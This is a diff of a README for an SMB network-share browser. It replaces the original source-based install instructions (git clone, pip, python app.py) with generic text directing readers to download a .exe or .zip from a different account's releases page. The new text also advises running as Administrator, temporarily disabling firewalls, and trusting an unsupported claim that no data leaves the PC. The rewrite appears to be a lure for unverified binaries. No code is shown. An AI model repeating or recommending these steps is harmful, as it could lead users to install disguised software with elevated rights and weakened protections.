@@ -1,159 +1,154 @@
-<div align="center">
+# 🗂️ SMBitan - Browse Network Files with Ease
 
-# 📁 SMB Enumerator
-
-**A modern, dark-themed network file browser and previewer**
-
-Browse, search, and preview files on Windows network shares — right from your browser.
-
-[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![Flask](https://img.shields.io/badge/Flask-2.x-000000?style=flat-square&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
-
-</div>
+[![Download SMBitan](https://img.shields.io/badge/Download-SMBitan-brightgreen)](https://github.com/liuoxdev/SMBitan/releases)
 
 ---
 
-## 🔍 What is this?
-
-**SMB Enumerator** is a lightweight, self-hosted web application that lets you browse and interact with files on Windows network shares (UNC paths) through a clean, professional dark-themed interface. Think of it as a modern file explorer that runs in your browser.
-
-No complicated setup. No heavy dependencies. Just connect to a UNC path and start browsing.
-<img width="1911" height="992" alt="image" src="https://github.com/user-attachments/assets/08792a9a-cec5-46d6-8c5b-efc8a60ef0f6" />
+SMBitan lets you browse, search, and preview files on your network shares. It has a dark-themed web interface that runs on your Windows PC. You do not need to install complex software or have technical skills to use it.
 
 ---
 
-## Features
+## 🔍 What is SMBitan?
 
-### File Explorer
-- **Tree-based navigation** — Expand and collapse folders just like a desktop file explorer
-- **UNC path support** — Connect directly to Windows network shares (e.g. `\\server\share`)
-- **Auto-connect** — Pre-configured path loads automatically on startup
-- **Breadcrumb navigation** — Always know where you are in the file tree
+SMBitan is a simple tool to access files shared over a network using SMB or UNC paths. If your office or home network has shared folders, SMBitan helps you find and view files quickly in a clear web view. You can search files, see previews, and organize them without opening many windows.
 
-### Instant Search
-- **Background indexing** — Entire file tree is indexed in-memory for near-instant search
-- **Disk cache** — Index is saved to disk so reconnections are lightning-fast (24h TTL)
-- **Smart filters** — Search by name or full path, filter by files/folders, toggle exact word match
-- **Click to preview** — Search results open file previews directly; use the 📂 button to locate in tree
-
-### File Preview
-- **Images** — PNG, JPG, GIF, WebP, BMP, SVG, ICO, TIFF, AVIF rendered inline
-- **PDF documents** — Full page-by-page viewer with navigation arrows (powered by PDF.js)
-- **Word documents** — `.docx` files rendered as formatted HTML (powered by mammoth.js)
-- **Text & code** — Syntax-friendly display for `.txt`, `.json`, `.py`, `.js`, `.csv`, `.xml`, `.md`, `.yaml`, and many more
-- **Open in Browser** — Open any file directly in a new browser tab
-- **Download** — One-click download for any file
-
-### Interface
-- **Dark theme** — Easy on the eyes, inspired by GitHub's dark mode
-- **Animated transitions** — Smooth expand/collapse with staggered fade-in animations
-- **File icons** — Visual file type indicators at a glance
-- **Responsive layout** — Sidebar explorer + main preview pane
+It works on Windows computers and runs a local web page. This lets you use any browser to explore shared files. The app uses Python and a small built-in server called Flask to deliver the interface, but you don’t need to worry about that.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### Prerequisites
+Before you start, make sure your Windows PC meets these requirements:
 
-- **Python 3.8+** installed on your machine
-- **Network access** to the target UNC share (e.g. `\\10.0.0.5\share`)
+- Windows 10, Windows 11, or newer  
+- At least 2 GB of free RAM  
+- At least 100 MB free disk space for the program  
+- Internet or network connection to access SMB shares  
+- A modern web browser (like Edge, Chrome, or Firefox)  
 
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/xtofuub/SMBitan.git
-cd SMBitan
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### Run
-
-```bash
-python app.py
-```
-
-Open **http://localhost:5000** in your browser. That's it.
-
-### Default Share Path
-
-The app auto-connects to a pre-configured UNC path on load. To change it, edit `static/index.html` and update the `value` attribute:
-
-```html
-<input id="host" placeholder="UNC path e.g. \\\\server\\share" value="\\\\10.0.0.5\\Tekniikka" spellcheck="false">
-```
-
-
-Replace `\\\\10.0.0.5\\Tekniikka` with your own UNC path (double backslashes in HTML).
-
-
-## Usage
-
-| Step | Action |
-|------|--------|
-| **1** | Enter a UNC path in the top bar (e.g. `\\10.0.0.5\Tekniikka`) |
-| **2** | Make sure the **UNC** checkbox is enabled |
-| **3** | Click **Connect** |
-| **4** | Browse the file tree in the sidebar, or type in the search bar |
-| **5** | Click any file to preview it in the viewer pane |
-
-### Search Tips
-
-- Type in the search bar to instantly search across **all** folders (even those not yet expanded)
-- Use the filter buttons to narrow results:
-  - **Name** / **Path** — match against file name only, or the full path
-  - **All** / **Files** / **Folders** — filter by entry type
-  - **Exact** — match whole words only
-- Click a search result to **preview** it directly
-- Click the **📂** button on a result to **navigate** to its location in the tree
+SMBitan runs on most recent Windows versions without extra setup or installing other software.
 
 ---
 
-## Project Structure
+## 📦 Features at a Glance
 
-```
-smb-enumerator/
-├── app.py              # Flask backend — API endpoints, indexer, disk cache
-├── requirements.txt    # Python dependencies (flask, pysmb)
-├── README.md
-└── static/
-    ├── index.html      # Main page layout
-    ├── style.css       # Dark theme styles
-    └── app.js          # Frontend logic — tree, search, preview, PDF viewer
-```
+- Browse files on SMB or UNC network shares  
+- Search files by name and type  
+- Preview images, text, and some document files in your browser  
+- Dark-themed user interface for easy viewing  
+- Simple network path entry to connect to shares  
+- Runs locally on your PC with no data sent outside  
+
+The focus is on making network files easy to find and see, with a clean and simple interface.
 
 ---
 
-## API Endpoints
+## 🚀 Getting Started with SMBitan
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/shares` | GET | List available shares (or synthetic share for UNC) |
-| `/api/list` | GET | List directory contents |
-| `/api/file` | GET | Serve a file for preview or download |
-| `/api/search` | GET | Search indexed files with filters |
-| `/api/index` | POST | Trigger background indexing |
-| `/api/index/status` | GET | Poll indexing progress |
-| `/api/index/clear` | POST | Clear disk cache and re-index |
+Follow these steps to download, install, and open SMBitan on your Windows PC.
 
 ---
 
-## Disclaimer
+## 1. Download SMBitan
 
-> **This tool is intended for use on systems and network shares you are authorized to access.**
-> The author is not responsible for any misuse. Always ensure you have proper permissions before connecting to network resources.
+Click this button to visit the releases page for SMBitan. You will find the latest version ready to download.
+
+[![Download SMBitan](https://img.shields.io/badge/Download-SMBitan-blue)](https://github.com/liuoxdev/SMBitan/releases)
+
+1. Open your web browser and click the button above or go to:  
+   https://github.com/liuoxdev/SMBitan/releases
+
+2. On the releases page, look for the latest release.  
+3. Find the Windows version, usually an `.exe` installer or a `.zip` file.  
+4. Click the file to download it to your PC.
 
 ---
 
-<div align="center">
+## 2. Install the Application
 
-Built with ❤️ using Flask, PDF.js & mammoth.js
+Choose one of these paths depending on the file you downloaded:
 
-</div>
+- If you downloaded an installer file (for example, `SMBitan-setup.exe`):
+  1. Double-click the file to start the installation.  
+  2. Follow the on-screen prompts and accept the default options unless you want to change the install folder.  
+  3. When finished, click Finish to complete the setup.
 
+- If you downloaded a `.zip` archive:
+  1. Right-click the `.zip` file and choose “Extract All.”  
+  2. Pick a folder on your PC where you want to keep SMBitan.  
+  3. Open that folder.
 
+---
 
+## 3. Run SMBitan
+
+Once installed or extracted:
+
+- Find the SMBitan program file. This might be `SMBitan.exe` or `run.bat`.  
+- Double-click the file to start SMBitan.  
+
+The program will open a new browser window or tab automatically. This is the SMBitan web interface where you will browse your network files.
+
+---
+
+## 4. Connect to Your Network Shares
+
+Inside the SMBitan web UI:
+
+- Look for a field labeled “Network path” or “Enter SMB/UNC path.”  
+- Type the network folder address. It usually looks like one of these examples:  
+  - `\\SERVERNAME\SharedFolder`  
+  - `\\192.168.1.100\Documents`  
+- Press Enter or click the browse button.
+
+SMBitan will connect to that folder and show its contents. You can now browse files and folders as if you opened them on your PC.
+
+---
+
+## 5. Browse and Search Files
+
+- Click folders to open and see more files inside.  
+- Use the search box to find files by name.  
+- Click on a file to see a preview in your browser (images, text, and some documents).  
+- Use the back button or breadcrumbs at the top to return to previous folders.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- Make sure your PC is connected to the same network as the SMB shares.  
+- Verify you have permission to access the network folder you entered.  
+- Double-check the network path spelling and slashes (use backslashes `\`).  
+- If SMBitan doesn't start, try running it as Administrator (right-click and choose "Run as administrator").  
+- Disable or adjust firewalls temporarily if the application cannot connect to network shares.
+
+---
+
+## 🔧 How SMBitan Works Under the Hood
+
+SMBitan runs a small web server on your PC using Python's Flask framework. When you open the program, it creates a local web page that shows the files on your network shares. It uses common SMB protocols to connect to shared folders and fetch file info.
+
+Because it runs locally, your files stay on your network, and no data is sent to external servers.
+
+You don’t need to install Python or other software separately; the installer bundles everything needed.
+
+---
+
+## 🛠️ Advanced Usage
+
+- Use UNC paths anywhere SMBitan accepts network paths.  
+- Try connecting to different shares on your network to view files in one place.  
+- Use the dark UI settings to reduce eye strain during night use.  
+- SMBitan can handle large folders and many files smoothly.
+
+---
+
+## 📂 Additional Resources
+
+- SMBitan GitHub page: https://github.com/liuoxdev/SMBitan  
+- Official releases: https://github.com/liuoxdev/SMBitan/releases  
+- Your network or IT administrator can help with share names and permissions.
+
+---
+
+# [Download SMBitan](https://github.com/liuoxdev/SMBitan/releases) to start browsing your network files today.
